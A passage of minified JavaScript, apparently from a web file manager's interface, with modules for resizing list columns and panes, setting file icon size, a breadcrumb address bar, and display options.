            }
            var s = function(e, t) {
                var n = t * i + e;
                $(a[n]).addClass(Config.SelectClassName)
            };
            ui.fileLight.clear();
            for (var r = e.row; t.row >= r; r++) {
                var l = 0,
                    c = n;
                r == e.row && (l = e.col), r == t.row && (c = t.col);
                for (var d = l; c >= d; d++) s(r, d)
            }
            ui.fileLight.select()
        };
    return {
        init: function() {
            n(), u(), g(), b()
        },
        isDraging: function() {
            return a
        },
        selectSplit: h,
        selectPos: L
    }
}), define("app/src/explorer/fileListResize", [], function() {
    var e = {
            filename: 250,
            filetype: 80,
            filesize: 80,
            filetime: 150,
            explorerTreeWidth: 199,
            editorTreeWidth: 199
        },
        t = {
            filename: 150,
            filetype: 60,
            filesize: 60,
            filetime: 120,
            explorerTreeWidth: 2,
            editorTreeWidth: 2
        },
        a = e,
        i = function() {
            if (LocalData.get("resizeConfig")) a = jsonDecode(LocalData.get("resizeConfig"));
            else {
                G.userConfig.resizeConfig !== void 0 && (a = jsonDecode(htmlDecode(G.userConfig.resizeConfig)));
                var i = jsonEncode(a);
                LocalData.set("resizeConfig", i)
            }
            $.each(e, function(i) {
                (!a[i] || a[i] < t[i]) && (a[i] = e[i])
            })
        },
        n = function() {
            if (!r()) {
                var e = jsonEncode(a);
                LocalData.set("resizeConfig", e), $.get(G.appHost + "setting/set&k=resizeConfig&v=" + e)
            }
        },
        o = function(e) {
            if ("icon" != G.userConfig.listType) {
                e || (e = a);
                var i = "",
                    n = 0;
                $.each(e, function(e, a) {
                    0 == e.indexOf("file") && (t[e] >= a && (a = t[e]), n += a, i += ".children-list,.file-list-list .file ." + e + ",#main-title ." + e + "{width:" + a + "px;}")
                }), i += ".children-list,.file-list-list .file{width:" + (n + 50) + "px;}", $.setStyle(i, "header-resize-width")
            }
        },
        s = function(i, o, s) {
            if (!$(".frame-left").is(":hidden")) {
                var r = Config.pageApp + "TreeWidth",
                    l = $.extend(!0, {}, a);
                l[r] += i, l[r] <= t[r] && (l[r] = t[r]);
                var c = l[r],
                    d = $(".frame-left"),
                    p = $(".frame-resize"),
                    f = $(".frame-right"),
                    u = e[r];
                if (c > u - 8 && u + 8 > c && (c = u + 1), s) {
                    var h = 400;
                    d.animate({
                        width: c
                    }, h), p.animate({
                        left: c - 5
                    }, h), f.animate({
                        left: c
                    }, h)
                } else d.css("width", c), p.css("left", c - 5), f.css("left", c);
                ui.setStyle !== void 0 && ui.setStyle(), o && (a = l, n())
            }
        },
        r = function() {
            return void 0 != $.getUrlParam("type") ? !0 : !1
        },
        l = function(e, i, s) {
            var r = $.extend(!0, {}, a);
            r[e] += i, o(r), s && (a = r, $.each(a, function(e, i) {
                t[e] >= i && (a[e] = t[e])
            }), n())
        },
        c = function() {
            $("#main-title").hasClass("bind-init") || (o(a), $("#main-title").addClass("bind-init"), $.each(e, function(e) {
                $("#main-title ." + e + "-resize").drag({
                    start: function() {},
                    move: function(t) {
                        l(e, t, !1)
                    },
                    end: function(t) {
                        l(e, t, !0)
                    }
                })
            }))
        },
        d = function() {
            var e = $(".frame-resize");
            e.drag({
                start: function() {
                    e.addClass("active"), $(".resize-mask").css("display", "block")
                },
                move: function(e) {
                    s(e, !1, !1)
                },
                end: function(t) {
                    s(t, !0, !1), e.removeClass("active"), $(".resize-mask").css("display", "none")
                }
            })
        },
        p = function() {
            var e = "fileIconSize";
            core.isApp("desktop") && (e = "fileIconSizeDesktop");
            var t = G.userConfig[e];
            t || (t = "75"), h(t, !1), f(t)
        },
        f = function(e) {
            $(".set-file-icon-size .file-icon-size").removeClass("selected");
            for (var t = [
                    ["40", "box-size-smallx"],
                    ["60", "box-size-small"],
                    ["80", "box-size-default"],
                    ["100", "box-size-big"],
                    ["120", "box-size-bigx"]
                ], a = 10, i = "", n = 0; t.length > n; n++) {
                var o = parseInt(t[n][0]);
                if (e >= o - a && o + a >= e) {
                    i = t[n][1];
                    break
                }
            }
            "" != i && $("." + i).addClass("selected")
        },
        u = function(e) {
            var t = "fileIconSize";
            core.isApp("desktop") && (t = "fileIconSizeDesktop"), G.userConfig[t] = e, f(e), $.get(G.appHost + "setting/set&k=" + t + "&v=" + e)
        },
        h = function(e, t) {
            var a = e,
                i = 105,
                n = 30,
                o = 250;
            core.isApp("desktop") && (n = 40, o = 150), a = n >= a ? n : a, a = a >= o ? o : a;
            var s = (e - n) * i / (o - n),
                r = 20,
                l = 10,
                c = parseInt(a),
                d = c + 2 * r - l + 5,
                p = c - l,
                f = c - l,
                h = .4 * c,
                m = c + 3 * r - l,
                v = ".file-list-icon div.file,.file-list-icon .flex-empty{height:" + d + "px;width:" + c + "px;}";
            core.isApp("desktop") && (d -= 5, v = "div.file-list-icon div.file,.file-list-icon .flex-empty{height:" + d + "px;width:" + c + "px;}"), $.browser.mozilla && (f -= 4);
            var g = "div.file-list-icon div.file{max-height:" + m + "px;}" + v + "			.file-list-icon .meta-info{height:" + h + "px;width:" + h + "px;				margin-right:" + .16 * h + "px;margin-top:-" + 1.1 * h + "px;}			.file-list-icon div.file .filename{width:" + c + "px;}			.file-list-icon div.file .filename #pathRenameTextarea,			.file-list-icon div.file .filename .newfile{width:" + c + "px;}			.file-list-icon div.file .ico{padding-left:" + l / 2 + "px;height:" + f + "px;width:" + p + "px}        	.file-list-icon div.file .ico.picture{width:" + p + "px;padding-left:" + l / 2 + "px;overflow:hidden;display:block;}        	";
            $.setStyle(g, "file_icon_resize"), $(".slider-handle").css("top", s), t && u(e)
        },
        m = function() {
            var e, t = $(".slider-handle");
            $(".set-icon-size-slider").bind("click", function(e) {
                return stopPP(e), !1
            });
            var a = function(t) {
                var a = 0,
                    i = 105,
                    n = 30,
                    o = 250,
                    s = e + t;
                s = a > s ? a : s, s = s > i ? i : s;
                var r = parseInt(s / i * (o - n) + n);
                return h(r, !1), r
            };
            t.drag({
                start: function() {
                    t.addClass("active"), e = parseInt(t.css("top"))
                },
                move: function(e, t) {
                    a(t)
                },
                end: function(e, i) {
                    t.removeClass("active"), u(a(i), !0)
                }
            });
            var i = $(".slider-bg");
            $(".slider-bg").unbind("click").bind("click", function(t) {
                var n = t.clientY - i.offset().top;
                e = 0, u(a(n), !0)
            })
        },
        v = function() {
            var e = function(e, t) {
                var a = e.parent(),
                    i = $(".split-box").index(a),
                    n = parseInt(a.data("before_width")) + t;
                if (!(150 > n)) {
                    $($(".split-line").get(i)).css("width", n), a.css("width", n), $(".split-box:gt(" + i + ")").each(function() {
                        $(this).hasClass("is-drag-split") || $(this).css("left", parseInt($(this).data("before_left")) + t + "px")
                    });
                    var o = [];
                    $(".split-box").each(function() {
                        o.push({
                            left: $(this).css("left"),
                            width: $(this).width()
                        })
                    }), LocalData.set("splitBoxSize", jsonEncode(o))
                }
            };
            $(".bodymain .file-list-split .split-drag").drag({
                start: function(e, t) {
                    var a = t.parent();
                    a.addClass("is-drag-split").data("before_width", a.width()), $(".split-box,.split-line").each(function() {
                        $(this).data("before_left", $(this).css("left"))
                    })
                },
                move: function(t, a, i, n) {
                    e(n, t)
                },
                end: function(e, t, a, i) {
                    i.parent().removeClass("is-drag-split")
                }
            }, !0), $(".file.select-split-parent").removeClass("select-split-parent"), $(".split-box").each(function() {
                $('.file[data-path="' + $(this).attr("data-path") + '"]').addClass("select-split-parent")
            }), g()
        },
        g = function() {
            var e = jsonDecode(LocalData.get("splitBoxSize")),
                t = 0;
            e || (e = []);
            var a = function(a, i) {
                var n = e[i];
                n || (n = {
                    width: 250,
                    left: t
                }), t += n.width + 1, a.css({
                    width: n.width + "px",
                    left: n.left
                })
            };
            t = 0, $(".split-box").each(function(e) {
                a($(this), e)
            }), t = 0, $(".split-line").each(function(e) {
                a($(this), e)
            }), $(".bodymain").scrollLeft(1e5)
        };
    return {
        init: function() {
            i(), r() && (a = e), o(a), d(), s(0, !1, !0), m()
        },
        initFileSize: p,
        bindSplitResize: v,
        bindHeaderResize: c,
        setFileIconSize: h
    }
}), define("app/src/explorer/headerAddress", [], function() {
    var e = function() {
            $("#yarnball li a").die("click").live("click", function(e) {
                var t = $(this).attr("data-path");
                n(t), stopPP(e)
            }), $("#yarnball").die("click").live("click", function() {
                return $("#yarnball").css("display", "none"), $("#yarnball-input").css("display", "block"), $("#yarnball-input input").focus(), !0
            });
            var e = $("#yarnball-input input");
            e.die("blur").live("blur", function() {
                n(e.val())
            }).keyEnter(function() {
                n(e.val())
            }), $(".header-right input").keyEnter(function() {
                ui.path.search($(".header-right input").val(), G.thisPath)
            }), $(".header-right input").bind("keyup focus", function() {
                ui.path.setSearchByStr($(this).val())
            }), $(".header-content a,.header-content button").click(function() {
                var e = $(this).attr("id");
                switch (e) {
                    case "btn-history-back":
                        ui.path.history.back();
                        break;
                    case "btn-history-next":
                        ui.path.history.next();
                        break;
                    case "refresh":
                        ui.f5(!0, !0), ui.tree.init();
                        break;
                    case "home":
                        ui.path.list(G.myhome);
                        break;
                    case "fav":
                        ui.path.pathOperate.fav({
                            path: G.thisPath,
                            type: "folder",
                            name: $("ul.yarnball li:last .title-name").html()
                        });
                        break;
                    case "goto-father":
                        o();
                        break;
                    case "setting":
                        core.setting();
                        break;
                    case "search":
                        ui.path.search($(".header-right input").val(), G.thisPath);
                        break;
                    default:
                }
                return !0
            })
        },
        t = function(e) {
            var t = G.thisPath;
            i(G.thisPath), $("#yarnball-input").css("display", "none"), $("#yarnball").css("display", "block");
            var n = function(e) {
                var t = '<li class="yarnlet first"><a title="@1@" data-path="@1@" style="z-index:{$2};"><span class="left-yarn"></span>{$3}</a></li>',
                    a = '<li class="yarnlet "><a title="@1@" data-path="@1@" style="z-index:{$2};">{$3}</a></li>';
                e = e.replace(/\/+/g, "/");
                var i = e.split("/");
                "" == i[i.length - 1] && i.pop();
                var n = i[0] + "/",
                    o = t.replace(/@1@/g, n),
                    s = i[0],
                    r = "";
                if (G.jsonData.info && G.jsonData.info.pathType && "" != i[0]) {
                    var l = core.getPathIcon(G.jsonData.info, G.jsonData.info.name);
                    r = '<span class="address-ico">' + core.iconSmall(l.icon) + "</span>", s = l.name
                }
                o = o.replace("{$2}", i.length), o = o.replace("{$3}", r + '<span class="title-name">' + htmlEncode(s) + "</span>");
                for (var c = o, d = 1, p = i.length - 1; i.length > d; d++, p--) {
                    n += htmlEncode(i[d]) + "/";
                    var o = a.replace(/@1@/g, n);
                    o = o.replace("{$2}", p), o = o.replace("{$3}", '<span class="title-name">' + htmlEncode(i[d]) + "</span>"), c += o
                }
                return '<ul class="yarnball">' + c + "</ul>"
            };
            void 0 == e && $("#yarnball").html(n(t)), a()
        },
        a = function() {
            $(".yarnball").stop(!0, !0);
            var e = $("#yarnball").innerWidth(),
                t = 0;
            $("#yarnball li a").each(function() {
                t += $(this).outerWidth() + parseInt($(this).css("margin-left")) + 5
            });
            var a = e - t;
            0 >= a ? $(".yarnball").css("width", t + "px").css("left", a + "px") : $(".yarnball").css({
                left: "0px",
                width: e + "px"
            })
        },
        i = function(e) {
            var t = $("#yarnball-input .path");
            if (void 0 == e) {
                var a = t.val();
                return a = rtrim(core.pathClear(a)) + "/"
            }
            t.val(e)
        },
        n = function(e, a) {
            e = e.replace(/\\/g, "/"), ui.path.list(e), t(a)
        },
        o = function() {
            var e = i();
            if ("/" == e || -1 == e.indexOf("/")) return Tips.tips(LNG.path_is_root_tips, "warning"), void 0;
            var a = core.pathFather(e);
            ui.path.list(a), t()
        };
    return {
        init: e,
        addressSet: t,
        resetWidth: a,
        gotoFather: o
    }
}), define("app/src/explorer/options", [], function() {
    var e = function() {
            "0" == _.get(window, "G.userConfig.fileSelect") && $.addStyle(".file-continer .file .item-select,			.file-continer .file .item-menu{display:none !important;}")
        },
        t = function() {
            "0" == _.get(window, "G.userConfig.imageThumb") && Hook.bind("explorer.list.fileThumb", function(e, t) {
                var a = "icon" != G.userConfig.listType,
                    i = ["jpg", "jpeg", "png", "bmp", "gif", "ico", "svg", "cur", "webp"];
                return inArray(i, t) ? "<div class='picture ico' filetype='" + t + "'>" + core.icon(t, a) + "</div>" : void 0
            })
        };
    return {
        init: function() {
            e(), t()
        }
    }
});